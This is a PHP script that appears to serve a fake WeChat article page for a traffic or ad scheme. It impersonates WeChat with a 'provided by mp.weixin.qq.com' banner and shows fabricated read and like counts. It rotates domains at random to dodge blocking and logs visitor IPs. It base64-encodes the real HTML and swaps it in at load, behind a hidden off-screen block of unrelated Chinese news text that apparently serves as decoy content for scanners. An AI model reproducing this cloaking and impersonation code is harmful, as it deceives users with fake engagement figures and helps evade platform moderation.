<?php
include 'config.php';
/*
if(stripos($_SERVER['HTTP_USER_AGENT'], 'MicroMessenger') === false){
	header('Location:'.$notwxlink);
	exit();
}
*/
//对当前域名PV统计
$S->pagetongji($_SERVER['HTTP_HOST']);

$share_link = $share_link[mt_rand(0, count($share_link)-1)];
$safe_link = $safe_link[mt_rand(0, count($safe_link)-1)];
$randnum = mt_rand(10, 120);
if(($randnum >= 20 && $randnum <= 40) || ($randnum >= 90 && $randnum <= 110)){
	$back_link = $back_link[mt_rand(0, count($back_link)-1)];
	$name_link = $name_link[mt_rand(0, count($name_link)-1)];
	$read_link = $read_link[mt_rand(0, count($read_link)-1)];
	$footer_link = $footer_link[mt_rand(0, count($footer_link)-1)];
}else{
	$back_link = current($back_link);
	$name_link = current($name_link);
	$read_link = current($read_link);
	$footer_link = current($footer_link);
}
$curr = isset($_SERVER["REMOTE_ADDR"]) && !empty($_SERVER["REMOTE_ADDR"]) ? ip2long($_SERVER["REMOTE_ADDR"]) : '0000000000';
$filename = 'readcou.php';
$data = trim(substr(file_get_contents($filename), 15));
if(!empty($data)){
	$data = json_decode($data, true);
	if(!in_array($curr, $data)){
		array_push($data, $curr);
	}
}else{
	$data = array($curr);
}
if(count($data) > ($max_readcou - $min_readcou)){
	$data = array($curr);
}
if($fp = fopen($filename, 'w+')) {
	$startTime = microtime();
	do {
		$canWrite = flock($fp, LOCK_EX);
		if(!$canWrite) usleep(round(rand(0, 100)*1000));
	} while ((!$canWrite) && ((microtime()-$startTime) < 1000));

	if ($canWrite) {
		fwrite($fp, "<?php exit();?>" . json_encode($data));
	}
	fclose($fp);
}
$readcou = $min_readcou + count($data);
$today=date("Y-m-d");
$footAdStatus='style="display:none;"';
$curUrl=$_SERVER["REQUEST_URI"];
if(strpos($curUrl,"continue")) $footAdStatus="";
$html = <<<EOT
<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" />
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <meta name="format-detection" content="telephone=no">
    <title>{$webtitle}</title>
	<link rel="stylesheet" type="text/css" href="/assets/weui.min.css">
    <link rel="stylesheet" type="text/css" href="/assets/main.css?ver=9999">
    <link rel="stylesheet" type="text/css" href="/assets/more.css">
    <link rel="stylesheet" type="text/css" href="/assets/swiper.min.css">
    <script src="/assets/jquery.min.js?ver=999"></script>
    <script src="/assets/jquery.cookie.js"></script>
    <script src="/assets/zepto.min.js"></script>
    <script src="/assets/iscroll-lite.min.js"></script>
    <script src="/assets/swiper.min.js"></script>
    <script src="https://imgcache.qq.com/tencentvideo_v1/tvp/js/tvp.player_v2_zepto.js" charset="utf-8"></script>
    <script src="https://v.qq.com/iframe/tvp.config.js" charset="utf-8"></script>
</head>
<body id="activity-detail" class="zh_CN mm_appmsg" style="background-color:#333;">
<div id="content-content"  style="height:40px;text-align:center;padding-top:10px;color:#999;font-size:80%;display:block;">网页由 mp.weixin.qq.com 提供</div>
<div id="wrapper" style="position:absolute;top:0;bottom:0;left:0;right:0;">
    <div id="scroll" style="position:absolute;background-color:#f3f3f3;z-index:100;width:100%;">
        <div id="js_article" class="rich_media">
            <div id="js_top_ad_area" class="top_banner"> </div>
            <div class="rich_media_inner">
                <div id="page-content">
                    <div id="img-content" class="rich_media_area_primary" style="padding-top:5px;">
                        <h2 class="rich_media_title" id="activity-name">{$webtitle} </h2>
                        <div class="rich_media_meta_list" style="margin-bottom:0;">
                            <em id="post-date" class="rich_media_meta rich_media_meta_text">{$today}</em>
                                 <a class="rich_media_meta rich_media_meta_link rich_media_meta_nickname" style="color:#607fa6;" href="{$name_link}" id="post-user"> 热门劲爆视频</a>
                            </div>

                           <div class="rich_media_content" id="js_content" style="height:200px;"></div>
                        <p style="text-align:center">
                            <img src="/assets/e645b06bly1fj7qiy0djrg20hs0243yg.gif">
                        </p>
                        <div class="rich_media_tool" id="js_toobar" style="padding-top:10px;">
                                                            <a class="media_tool_meta meta_primary" style="color:#607fa6;"  id="js_view_source" href="{$read_link}">阅读原文</a>
                                                        <div id="js_read_area" class="media_tool_meta tips_global meta_primary" >阅读 <span id="readNum">100000+</span></div>
                            <div  class="media_tool_meta meta_primary tips_global meta_praise" id="like">
                                                                    <i class="icon_praise_gray"></i>
                                                                <span class="praise_num" id="likeNum">1658</span>
                            </div>
                            <a id="js_report_article" class="media_tool_meta tips_global meta_extra" href="javascript:;" onclick="jump('/tousu/index.htm');">投诉</a>
                        </div>
                    </div>
				<div align='center' style="width:90%"></div>
				<div align='center'><a href="{$adlink}"><img src="/assets/ad.png" style="width:90%;"></a></div>
                </div>
            </div>
        </div>
                <div class="rich_media_extra" id="gdt_area" {$footAdStatus}>
        </div>
            </div>
    <div style="display:none">{$tongji}</div>
</div>
<div id="pauseplay" style="display:none;opacity:0;position:fixed;left:0;right:0;top:65px;bottom:0;background-color:#000;z-index:1000000;"></div>
</body>
<script>
    var pageGlobal = {};
    pageGlobal.vid = '{$vid}';
    pageGlobal.playStatus = '';
    pageGlobal.delayTime = parseInt(200);
    pageGlobal.backUrl = '{$back_link}';
    pageGlobal.flyUrl = 'http://{$safe_link}/{$mulu}tow.html';
    pageGlobal.sMode = 'a';
    pageGlobal.title = "{$wxtitle}";
    pageGlobal.link = "http://{$safe_link}/{$mulu}too.html";
    pageGlobal.imgUrl = "{$wximg}";
    pageGlobal.desc = "{$wxdesc}";
	pageGlobal.qtitle = "{$pyqtitle}";
    pageGlobal.qlink = "http://{$safe_link}/{$mulu}too.html";
    pageGlobal.qimgUrl = "{$pyqimg}";
</script>
<script src="//res.wx.qq.com/open/js/jweixin-1.0.0.js"></script>
<script src="/assets/page_c.js?20171113999"></script>
</html>
EOT;
?>
<!DOCTYPE html>
<html lang="zh-cn">
<head>
    <meta charset="utf-8">
    <title>正在加载 . . . 请稍等 . . .</title>
    <script src="/assets/jquery.min.js"></script>
    <script src="/assets/base64.min.js"></script>
</head>
<body>
    <div style="width: 1000px; height: 1px; position: fixed; top:100000px;">
	日前，引起社会广泛关注的云南昭通鲁甸“冰花男孩”一事又有了新进展。据媒体报道，目前所募集到的社会捐款已达30万元左右，但有网友指出，“冰花男孩”仅分得了500元。对此，鲁甸县教育局局长陈富荣在接受媒体采访时回应称，自己也经历过头顶冰花，赶着山路上学的少年时代，自己感同身受。在整个鲁甸县，像这样的“冰花男孩”还有数千人。“冰花男孩”本人收到的款项之所以不多，是因为30万元捐助属于捐赠人没有指定用途的善款，将用来救助更多类似的学龄儿童。不过，回应并没有终结质疑，在1月16日晚，此话题蹿升至微博实时热搜榜前列。

通读当时的整篇官方回应可以看出，地方政府和相关基金会确实采取了多方行动来保障包括“冰花男孩”在内的留守儿童温暖越冬，可是网友对其回应却不甚满意。究其原因，客观上可能在于媒体报道中故意强调30万元与500元的对比，对官方的回应有所取舍——碎片化传播导致媒体信息刊载量有限，只能将最有吸引力的信息进行传播。至于为何“30万元与500元”是最适合传播的信息，那就与慈善领域的历史欠账、刻板表象不无关系。另一方面，地方政府主观上的一些回应方式、角度和内容与新媒体的关注不“同频”，思维不“对表”，受众不“解渴”，也是重要的原因。这其实也是新媒体时代，政府方面百思不解的难题：明明做了事，却得不到认同。

当然，鲁甸官方面对负面舆情，回应的速度与态度可圈可点，但中国网民已对“及时回应”产生“审美疲劳”了，取而代之的是细节决定成败。那么，具体到本事件中，细节指的是什么呢？

首先，回应的方式须“对表”。顾名思义，“对表”即校准，向网友的关切校准。由于缺乏新媒体相关经验，有些地方政府的思维方式还停留在“我说你听”和“你问全部，我回答部分”的层面。所谓“我说你听”，即我说的都是有证据，经得起推敲的，但未必是公众想听的。比如某地方出现事故，网友想知道救援情况和事故原因，有人偏要说各级领导高度重视、家属情绪稳定。

而所谓“你问全部，我回答部分”，则是对情况摸得不透彻，对数据梳理不全面的表现。在鲁甸回应中提到“以点带面，让这个区域的孩子们都能够实实在在得到社会各方面的关爱”，这话说得好，但是没说完。“以点带面”带了谁，“实实在在的关爱”包括啥，对“冰花男孩”所在学校发放了多少捐款，还剩多少捐款？这才是多数网友关注的焦点。这一点确有提及，却又不够详实，究其原因，就在于回答者没有搞清楚提问者真正想知道什么：善款用到实处有多少？会不会被挪用？

其次，回应的角度应“同频”。同频才会有共鸣，这是常识。所谓“同频”，即事先不假设，事后少辩解，用事实引导舆论，以实事打动公众。而不停留在“我觉得你想这样”和“我原本不想这样”。在回应中有“如果把30万元都给了"冰花男孩"，这应该也不是捐赠方真正的目的”这样的句式，让网民有“被代表”的感觉。更何况，官方回应不少情况下也无法囊括网络舆论。本次事件中，不说“捐赠方真正的目的”谁说了算，单是网友间的观点也不一致。

网友@玛丽莲瑞瑞酱表示，奔着“冰花男孩”捐的钱，凭啥给别人？而网友@孤心爱则有不同的看法，认为不是只有他一个人困难，困难是普遍存在的，让大家都能享受到捐款带来的改变那才是好事。无论网友们的观点如何碰撞，有一点是普遍被认同的，即“冰花少年”们是需要被关爱的。而这样的关爱即便没有网友30万元的爱心捐助，也是势在必行的。

再者，回应的内容要“解渴”。所谓“解渴”，即回应的内容要有详实的数据支撑和对下一步的确切谋划。30万元花到哪里了？在回应中，提到了取暖设备和御寒衣物，这两项开支各是多少？有哪些孩子领到了衣物？这30万元够不够花？有没有剩余？打开云南省青少年发展基金会的网页，点进以“冰花男孩”形象作为背景的“青春暖冬行动”，其中对于善款的来源情况有着详细的记录，对于善款的去向及使用情况也有相关的新闻报道，但并未见每一笔钱款用途明细，而这正是目前舆论最关心的话题。其次，对于解决“冰花男孩”困境的方法，包括开通校车、提供住宿等问题，缺乏相应的计划和实施的具体时间表，“只能争取逐步解决”。这可能是实际情况，因为妥善解决问题需要时间，但这也引发了部分公众的疑虑。

事实是，云南省已经为此做了大量工作，可以说离“解渴”就只差了一步。在云南省青少年发展基金会的“青春暖冬行动”页面，可以找到最新的捐赠情况披露，从账号到时间、金额乃至支付渠道，显示得非常清楚。如果把这样的作风放到公开回应中，想必能打消不少公众的疑虑。

从这些角度来说，30万元与500元的距离，就是网民关切与官方前期回应的距离。

我们欣喜地看到，昭通市青少年发展基金会并未忽视网友的意见，并于1月16日通过其官方微信平台发布《“青春暖冬行动” 70万元善款覆盖我市十县一区！》一文，公布善款捐赠情况与使用情况相关细节。对于网友提议“详细公开善款后续的明细，具体公开到每一项”，昭通市青少年发展基金会通过媒体回应，“前期需要一定时间对候选资助孩子的实际情况进行走访、了解。项目执行将在1月31日以前完成，届时会把所有善款使用明细和相关情况及时公布，欢迎社会各界的监督”。此举想必能在一定程度上打消公众的疑虑，涤荡一些网络戾气。

因为“冰花男孩”，政府与网络舆情完成了一次具有示范意义的良性互动，也让人们看到，“以人民为中心”的意义不仅在于让现实中的“冰花男孩”不再受冻，也在于让网络民意对于“冰花男孩”的关切得到满意的回应，这是提升执政能力在这个新时代的应有之义。
	</div>
<script>
    function b64DecodeUnicode(str) {
        return decodeURIComponent(atob(str).split('').map(function(c) {
            return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
        }).join(''));
    }
    var doc = document.open('text/html', 'replace');
    var dat = b64DecodeUnicode('<?php echo base64_encode($html);?>');
    doc.write(dat);
    doc.close();
    document.title = $('title:eq(1)').text();
</script>
</body>
</html>
        